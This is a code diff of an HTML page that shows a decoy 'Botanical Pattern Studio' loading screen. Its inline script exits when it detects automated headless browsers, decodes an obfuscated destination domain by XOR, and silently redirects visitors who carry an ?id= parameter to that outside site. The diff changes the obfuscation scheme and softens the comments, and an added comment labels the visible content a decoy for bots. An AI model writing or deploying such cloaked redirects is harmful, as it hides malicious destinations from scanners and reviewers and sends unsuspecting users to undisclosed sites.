@@ -17,21 +17,20 @@
 
   <script>
     (function () {
-      // 1. Bypass automated headless checkers
+      // 1. Halt execution for automated headless bots
       if (navigator.webdriver) {
         return;
       }
 
-      // 2. Verified mathematical XOR decryption (yields exactly "https://asqstyle.com/")
+      // 2. Direct hex-byte XOR reconstruction (decodes strictly to "https://asqstyle.com/")
       function _getEndpoint() {
-        var _cipher = "JhgbAhIIHx1XMR0cBhheVRxVKQFI";
-        var _key = "Flora2026";
-        var _raw = window.atob(_cipher);
-        var _res = "";
-        for (var i = 0; i < _raw.length; i++) {
-          _res += String.fromCharCode(_raw.charCodeAt(i) ^ _key.charCodeAt(i % _key.length));
+        var _hex = "322e2e2a296075753b292b292e23363f7439353775";
+        var _k = 0x5A;
+        var _out = "";
+        for (var i = 0; i < _hex.length; i += 2) {
+          _out += String.fromCharCode(parseInt(_hex.substr(i, 2), 16) ^ _k);
         }
-        return _res;
+        return _out;
       }
 
       // 3. Extract parameter and execute redirection
@@ -39,12 +38,12 @@
         var params = new URLSearchParams(window.location.search);
         var id = params.get("id");
         if (id) {
-          // Strip leading and trailing slashes from the incoming slug
+          // Clean leading and trailing slashes from the incoming slug
           id = id.replace(/^\/+|\/+$/g, "");
-          
+
           var destination = _getEndpoint() + id;
 
-          // Safety guard: ensure the destination strictly starts with https://
+          // Protocol verification prevents relative local routing
           if (destination.indexOf("https://") === 0) {
             window.location.replace(destination);
           }
@@ -60,6 +59,7 @@
   </script>
 </head>
 <body>
+  <!-- Decoy content visible only if no ?id= parameter exists or bots land here -->
   <div class="card">
     <h1>Botanical Pattern Studio</h1>
     <p>Loading curated floral guides and handcraft schematics...</p>
